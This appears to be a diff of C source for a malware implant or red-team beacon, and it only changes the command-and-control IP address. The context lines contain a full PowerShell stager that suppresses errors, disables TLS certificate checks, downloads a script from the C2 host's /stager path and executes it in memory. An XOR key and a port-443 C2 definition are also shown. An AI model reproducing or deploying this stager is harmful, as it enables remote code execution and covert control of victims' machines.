@@ -23,7 +23,7 @@
 #pragma comment(lib, "oleaut32.lib")
 #pragma comment(lib, "advapi32.lib")
 
-#define C2_HOST_TASK  L"192.168.42.124"
+#define C2_HOST_TASK  L"192.168.122.47"
 #define C2_PORT_TASK  443
 
 static const BYTE g_xor_key[32] = {
@@ -121,7 +121,7 @@ static const char g_stager_ps[] =
     "$ErrorActionPreference='SilentlyContinue';"
     "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
     "[Net.ServicePointManager]::SecurityProtocol=3072;"
-    "$r=[System.Net.HttpWebRequest]::Create('https://192.168.42.124/stager');"
+    "$r=[System.Net.HttpWebRequest]::Create('https://192.168.122.47/stager');"
     "$r.ServerCertificateValidationCallback={$true};"
     "$s=New-Object IO.StreamReader($r.GetResponse().GetResponseStream());"
     "[scriptblock]::Create($s.ReadToEnd()).Invoke()";
@@ -149,7 +149,7 @@ static wchar_t *_write_stager_ps1(void) {
         "$ErrorActionPreference='SilentlyContinue'\r\n"
         "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}\r\n"
         "[Net.ServicePointManager]::SecurityProtocol=3072\r\n"
-        "$r=[System.Net.HttpWebRequest]::Create('https://192.168.42.124/stager')\r\n"
+        "$r=[System.Net.HttpWebRequest]::Create('https://192.168.122.47/stager')\r\n"
         "$r.ServerCertificateValidationCallback={$true}\r\n"
         "$s=New-Object IO.StreamReader($r.GetResponse().GetResponseStream())\r\n"
         "[scriptblock]::Create($s.ReadToEnd()).Invoke()\r\n";
